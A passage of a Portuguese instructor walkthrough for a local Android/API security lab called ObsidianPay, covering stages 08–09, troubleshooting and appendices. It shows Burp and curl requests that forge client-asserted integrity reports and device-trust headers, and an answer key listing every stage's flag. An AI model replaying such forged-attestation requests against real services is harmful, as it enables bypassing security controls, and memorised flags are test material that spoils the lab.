- **Backend:** sim.
- **Emulador:** sim.
- **App:** sim (logado).
- **Burp:** sim (caminho principal).
- **JADX:** sim (ver `NativeGate`/`TamperCheck`).
- **Frida:** opcional/recomendado (`04-integrity-native-bypass.js`).

### Onde começar no aplicativo

1. Na **Home**, abra **App Integrity**.
2. Use **Run Integrity Check** e **Send Integrity Report** — isso dispara
   `POST /api/mobile/internal/app-integrity`, visível no Burp.

### Passo a passo manual

1. No app (App Integrity), rode a checagem e envie o relatório.
2. No Burp, ache `POST /api/mobile/internal/app-integrity` → **Send to Repeater**.
3. Edite o body para **reportar um bypass de NativeGate** (o que um atacante faria
   após hookar/patchar o app):
   ```json
   {"tamperScore":0,"bypassHintIds":["jni-return-value-hook"]}
   ```
   - (Também vale `"patch-native-gate-result"`, ou
     `"nativeGateStatus":"jni-return-value-hook"`.)
4. **Send.** A resposta inclui `integrityCheckpoint.flag`.
5. (JADX) Abra `integrity/NativeGate.kt` e `integrity/TamperCheck.kt`: tudo é
   calculado **no processo do app** e enviado como JSON sem assinatura — qualquer
   valor pode ser forjado.
6. (Frida) O `04-integrity-native-bypass.js` força `getNativeGateStatus()` /
   checks de `TamperCheck`, fazendo o **próprio app** enviar o relatório de bypass.

### O que observar

- **Response:**
  ```json
  "integrityCheckpoint": {
    "stageId": "stage-08-app-integrity",
    "flag": "FLAG{obsidianpay_integrity_bypass_08}"
  }
  ```
- O campo `integrityPolicy` é `report-only` e `serverTrust` é
  `client-asserted-integrity` — o servidor **nunca bloqueia**.

### Por que isso é vulnerável

A integridade é verificada **só no cliente**. Um relatório sem HMAC/nonce é
trivialmente forjado (via Burp) ou produzido por hook/patch (Frida/apktool). Como
o servidor é report-only e confia no que recebe, a “proteção” não protege nada — é
o ponto de ensino sobre **confiança indevida no cliente**.

### Como obter a flag

A flag vem em `integrityCheckpoint.flag` na resposta de
`POST /api/mobile/internal/app-integrity` quando o relatório indica um bypass de
NativeGate (`bypassHintIds` contendo `jni-return-value-hook` ou
`patch-native-gate-result`, ou `nativeGateStatus` igual a um desses).

**Flag:** `FLAG{obsidianpay_integrity_bypass_08}`

> **Confirmação rápida (instrutor) — curl:**
> ```bash
> curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/app-integrity \
>   -H "Authorization: Bearer obsidian-mobile-token-guest-1001" \
>   -H 'Content-Type: application/json' \
>   -d '{"tamperScore":0,"bypassHintIds":["jni-return-value-hook"]}' \
>   | jq .integrityCheckpoint.flag
> ```

### Como submeter a flag

[Modelo único de submissão](#como-submeter-qualquer-flag-modelo-único) com:

```json
{"stageId":"stage-08-app-integrity","flag":"FLAG{obsidianpay_integrity_bypass_08}","evidence":"app-integrity report com bypassHintId de NativeGate"}
```

- **Resultado esperado:** `pointsAwarded:300`.

### Evidência obrigatória

- Request do Repeater com o `bypassHintIds`.
- Response com `integrityCheckpoint` e `integrityPolicy: report-only`.
- (Opcional) log do Frida `04-integrity-native-bypass.js`.
- Resposta do submit com `pointsAwarded:300`.

### Erros comuns

- **Sem `integrityCheckpoint`:** o `bypassHintIds` não contém um hint reconhecido
  (`jni-return-value-hook` ou `patch-native-gate-result`).
- **503 “App integrity endpoint is not enabled”:** backend não-padrão; use o do
  lab.
- **401 unauthorized:** faltou o Bearer.

### Checklist da etapa

- [ ] ação concluída (relatório de integridade com bypass aceito);
- [ ] vulnerabilidade demonstrada (integridade report-only/client-asserted);
- [ ] evidência salva;
- [ ] flag obtida (`FLAG{obsidianpay_integrity_bypass_08}`);
- [ ] flag submetida;
- [ ] pontuação confirmada (300 pts).

---

## Stage 09 — Final Operator Chain

### Objetivo

Consolidar todas as trilhas internas e destravar a **flag final**. O endpoint de
finalização exige um header de device-trust **e** quatro “provas” — uma para cada
trilha dominada (device-trust, vault, integridade e rede).

### O que deve estar aberto

- **Backend:** sim.
- **Emulador:** opcional (este stage é montado no Burp Repeater).
- **App:** opcional.
- **Burp:** sim (caminho principal).
- **JADX / Frida:** não necessários.

### Onde começar no aplicativo

Este stage não tem uma tela própria. Confirme primeiro, no `GET
/api/mobile/challenge/progress` (Repeater), que os **stages 01–08 já foram
submetidos** (`finalUnlocked: true`). Depois monte o request final no Repeater.

### As quatro provas exigidas

O endpoint `POST /api/mobile/internal/finalize-operator` exige:

- **Header:** `X-Obsidian-Device-Trust: trusted-legacy` (vem da trilha do Stage
  05).
- **Body com 4 campos (qualquer valor “truthy”):**
  - `deviceTrustProof` — representa o domínio do Stage 05;
  - `vaultProof` — representa o Stage 06;
  - `integrityProof` — representa o Stage 08;
  - `networkProof` — representa o Stage 07.

> Faltando o header **ou** qualquer prova, o endpoint responde **403** e **não**
> vaza a flag.

### Passo a passo manual

1. No Repeater, confirme `finalUnlocked: true` em
   `GET /api/mobile/challenge/progress`.
2. Monte o request final, campo por campo:
   ```
   POST /api/mobile/internal/finalize-operator HTTP/1.1
   Host: 10.0.2.2:8102
   Authorization: Bearer obsidian-mobile-token-guest-1001
   X-Obsidian-Device-Trust: trusted-legacy
   Content-Type: application/json

   {"deviceTrustProof":"sig","vaultProof":"unlock","integrityProof":"nativegate","networkProof":"pinning"}
   ```
3. **Send.**
4. **Interprete erros** quando uma prova/header faltar:
   - Sem o header → `403 finalize-operator requires a trusted-legacy device-trust header.`
   - Faltando uma prova → `403 ... Missing: <campo>` (ele diz **qual** prova
     faltou).
5. Com tudo presente, a resposta traz `status: "operator-chain-finalized"` e a
   **flag final** em `flag`.
6. Copie a flag final.

### O que observar

- **Response final:**
  ```json
  {
    "status": "operator-chain-finalized",
    "stageId": "stage-09-final-operator-chain",
    "flag": "FLAG{obsidianpay_final_operator_chain_09}",
    "totalScore": ...
  }
  ```

### Por que isso é vulnerável

A cadeia final reúne os mesmos anti-padrões: confiança em **headers/provas
fornecidos pelo cliente** como atestado de segurança. Nenhuma das “provas” é
verificada de forma independente — basta apresentá-las. É a demonstração de que
encadear controles client-side fracos não cria um controle forte.

### Como obter a flag

A flag final vem no campo `flag` da resposta de
`POST /api/mobile/internal/finalize-operator`, com o header
`X-Obsidian-Device-Trust: trusted-legacy` e as 4 provas no body.

**Flag final:** `FLAG{obsidianpay_final_operator_chain_09}`

> **Confirmação rápida (instrutor) — curl:**
> ```bash
> curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/finalize-operator \
>   -H "Authorization: Bearer obsidian-mobile-token-guest-1001" \
>   -H 'X-Obsidian-Device-Trust: trusted-legacy' -H 'Content-Type: application/json' \
>   -d '{"deviceTrustProof":"sig","vaultProof":"unlock","integrityProof":"nativegate","networkProof":"pinning"}' \
>   | jq .flag
> ```

### Como submeter a flag

[Modelo único de submissão](#como-submeter-qualquer-flag-modelo-único) com:

```json
{"stageId":"stage-09-final-operator-chain","flag":"FLAG{obsidianpay_final_operator_chain_09}","evidence":"finalize-operator com header device-trust + 4 provas"}
```

- **Resultado esperado:** `pointsAwarded:400`, `totalScore:2100`.

**Conferir o scoreboard final (Repeater ou curl):**

```
GET /api/mobile/challenge/scoreboard HTTP/1.1
Host: 10.0.2.2:8102
Authorization: Bearer obsidian-mobile-token-guest-1001
```

- **Resultado esperado:**
  ```json
  { "totalScore": 2100, "solvedStages": 9, "totalStages": 9,
    "completionPercent": 100, "finalUnlocked": true }
  ```

### Evidência obrigatória

- Request do finalize-operator (header + 4 provas) e a response com a flag final.
- (Opcional) uma response 403 propositalmente sem uma prova, mostrando o erro.
- Resposta do submit do stage-09 com `pointsAwarded:400`.
- Scoreboard final com `completionPercent: 100` e `finalUnlocked: true`.

### Erros comuns

- **403 com “Missing: ...”:** falta uma das 4 provas no body; adicione o campo
  citado.
- **403 device-trust header:** falta `X-Obsidian-Device-Trust: trusted-legacy`.
- **`finalUnlocked: false`:** algum dos stages 01–08 não foi submetido — confirme
  no `progress`.
- **`totalScore` diferente de 2100:** algum stage não foi submetido (ou foi
  submetido em duplicidade — duplicatas não somam de novo).

### Checklist da etapa

- [ ] ação concluída (finalize-operator com header + 4 provas);
- [ ] vulnerabilidade demonstrada (provas client-side como atestado);
- [ ] evidência salva;
- [ ] flag obtida (`FLAG{obsidianpay_final_operator_chain_09}`);
- [ ] flag submetida;
- [ ] pontuação confirmada (400 pts; `totalScore` 2100, `completionPercent` 100,
      `finalUnlocked` true).

---

## Troubleshooting geral

| Sintoma | Causa provável | Ação |
|---|---|---|
| Backend não sobe | imagem antiga / build quebrado | `docker compose down` e `docker compose up --build`; ler o log do container. |
| Porta 8102 ocupada | outro processo na porta | `ss -ltnp \| grep 8102` (ou `lsof -i :8102`), encerrar o processo. |
| `/health` não responde | backend desligado | suba o backend (Parte 1.2) e tente de novo. |
| Emulador não aparece no `adb` | boot incompleto / sem autorização | aguarde o boot; aceite “Allow USB debugging”; `adb devices`. |
| App “sem internet” | API Host errado ou proxy do Burp ativo sem o Burp aberto | confirme `http://10.0.2.2:8102`; remova o proxy (Parte 2.6) se o Burp estiver fechado. |
| Burp não vê tráfego | listener só em 127.0.0.1 / proxy do emulador errado | listener em `0.0.0.0:8080`; proxy do emulador `10.0.2.2:8080`; Intercept off. |
| `run-as: package not debuggable` | build release instalado | use o `app-debug.apk` (applicationId `...debug`). |
| `content query` → `Unknown URI` | authority/path errados | use `content://com.obsidianpay.mobile.provider.notes/notes`. |
| `am start` → `Permission Denial` | pacote errado | `-n com.obsidianpay.mobile.debug/com.obsidianpay.mobile.platform.InternalOpsActivity`. |
| Frida `process not found` | app não está rodando / nome errado | inicie o app; use `com.obsidianpay.mobile.debug`. |
| Frida `version mismatch` | server incompatível | instale o `frida-server` da versão do cliente; ou use o caminho via Burp. |
| `submit accepted:false` | flag/`stageId` errados | confira o `stageId` e a flag exata (sem espaços). |
| `submit duplicate:true` `pointsAwarded:0` | stage já resolvido | comportamento idempotente — não é erro. |
| `totalScore` parece baixo | algum stage não submetido | confira `progress`; o total da cadeia completa é **2100**. |
| Android SDK ausente | sem Android Studio/SDK | os checkpoints de backend podem ser confirmados por `curl`; só os passos com app/adb/Frida exigem o SDK. |

**Como resetar entre alunos/turmas:** o placar é em memória; reiniciar o backend
zera tudo:

```bash
docker compose down
docker compose up --build -d
```

### Checklist de encerramento (instrutor)

Antes de encerrar a turma / conferir a conclusão de um aluno:

- [ ] Backend de pé em `127.0.0.1:8102`, `/health` ok (`docker compose ps`).
- [ ] Login `guest`/`guest123` retorna token.
- [ ] Os 9 stages submetidos (ver `GET /api/mobile/challenge/progress`).
- [ ] **Final Operator Chain** (Stage 09) executada de ponta a ponta (header
      `X-Obsidian-Device-Trust: trusted-legacy` + 4 provas).
- [ ] Scoreboard final: `totalScore=2100`, `solvedStages=9`,
      `completionPercent=100`, `finalUnlocked=true`.
- [ ] Evidências registradas por stage (campo `evidence` do submit + pasta
      `evidence/stage-0X`).
- [ ] Backend resetado entre turmas (placar em memória).

---

## Apêndice A — Referência rápida (flags, endpoints, pontos)

> **Material de instrutor — contém as flags reais.** chainId
> `obsidianpay-mobile-final-chain` · 9 estágios · **total 2100 pontos**.

| # | Stage ID | Pts | Flag | Gatilho do checkpoint |
|---|---|---|---|---|
| 1 | `stage-01-recon` | 100 | `FLAG{obsidianpay_mobile_recon_01}` | `GET /api/mobile/config` + header `X-Obsidian-Recon: mobile-config-review`. |
| 2 | `stage-02-insecure-storage` | 150 | `FLAG{obsidianpay_insecure_storage_02}` | `POST /api/mobile/support/sync` body `{"message":"...","cacheCheckpoint":"local-storage-review"}`. |
| 3 | `stage-03-exported-components` | 200 | `FLAG{obsidianpay_exported_components_03}` | Trilha Android (ADB): provider/receiver/activity exportados. Flag validada no submit. |
| 4 | `stage-04-webview-bridge` | 200 | `FLAG{obsidianpay_webview_bridge_04}` | `GET /api/mobile/webview/support?topic=bridge-audit&message=cache-review`. |
| 5 | `stage-05-device-trust` | 250 | `FLAG{obsidianpay_device_trust_05}` | `POST /api/mobile/internal/device-trust` com client id legacy + assinatura SHA-1 forjada. |
| 6 | `stage-06-biometric-vault` | 250 | `FLAG{obsidianpay_biometric_vault_06}` | `POST /api/mobile/internal/vault-mobile/unlock` body `{"localAuth":true,"vaultUnlocked":true}`. |
| 7 | `stage-07-network-pinning` | 250 | `FLAG{obsidianpay_network_pinning_07}` | `GET /api/mobile/internal/network-profile` + header `X-Obsidian-Network-Review: burp-pinning-check`. |
| 8 | `stage-08-app-integrity` | 300 | `FLAG{obsidianpay_integrity_bypass_08}` | `POST /api/mobile/internal/app-integrity` body `{"bypassHintIds":["jni-return-value-hook"]}`. |
| 9 | `stage-09-final-operator-chain` | 400 | `FLAG{obsidianpay_final_operator_chain_09}` | `POST /api/mobile/internal/finalize-operator` (header `X-Obsidian-Device-Trust: trusted-legacy` + 4 provas). |

**Endpoints da cadeia (todos exigem `Authorization: Bearer <token>`):**

- `GET  /api/mobile/challenge/progress` — overview por estágio (sem flags).
- `POST /api/mobile/challenge/submit` — valida flag e pontua (idempotente).
- `GET  /api/mobile/challenge/scoreboard` — `totalScore`, `solvedStages`,
  `completionPercent`, `finalUnlocked`.
- `POST /api/mobile/internal/finalize-operator` — Stage 09.

**Contas:** pública `guest`/`guest123` (a única documentada). Internas
`analyst`/`operator` existem no backend para descoberta, **não** são necessárias
para a cadeia e **não** aparecem em docs públicos.

---

## Apêndice B — Histórico de construção do lab

> Resumo de manutenção. O laboratório foi construído por fases incrementais; este
> apêndice documenta o que cada fase entregou. **Nada aqui contradiz o estado
> final** descrito acima — o app, o backend, os 9 stages e a cadeia final estão
> todos implementados e cobertos pela solução deste documento.

| Fase | Entrega |
|---|---|
| 1–2 | Backend mobile (Node/Express, `127.0.0.1:8102`) + vulnerabilidades de API (IDOR, mass assignment, gates fracos, scaffolds de QR/WebView/vault). |
| 3–4 | App Android base (Kotlin/Compose) + armazenamento local inseguro (SharedPreferences/SQLite/arquivos). |
| 5–6 | Deep links / QR / Web Support + WebView JavaScript bridge (`ObsidianBridge`). |
| 7 | Componentes Android exportados (`InternalOpsActivity`, `DebugCommandReceiver`, `ObsidianNotesProvider`). |
| 8–9 | Reverse engineering / Device Trust (`HardcodedSecrets`, `LegacyRequestSigner`) + checagem de ambiente (root/emulador). |
| 10–11 | Secure Vault / local auth + Network Security / API Host override (pinning scaffold). |
| 12–13 | App Integrity / NativeGate / TamperCheck + Dynamic Instrumentation scaffold (Frida/ADB). |
| 14 | Final Challenge Chain (9 estágios, flags em `api/src/flags.js`, scoring local, submit/scoreboard, finalize-operator). |
| 15–18 | Documentação final (walkthrough de instrutor, student guide sem spoilers, roadmap, README), QA e prontidão de build Android. |
| 19 | **Este walkthrough** — guia manual completo, linear e iniciante; consolidação do roadmap; classificação do README; correção da pontuação total para 2100. |

### Notas de manutenção

- As flags reais **não** entram em `README.md`, `STUDENT-GUIDE.md` nem em
  `docs/*` — apenas em `api/src/flags.js` e neste arquivo.
- O placar é em memória: reiniciar o backend zera o progresso.
- Tudo é **local**: porta `127.0.0.1:8102` (emulador `10.0.2.2:8102`), sem
  dependências externas.
- A pontuação total real da cadeia é **2100** (100+150+200+200+250+250+250+300+400).
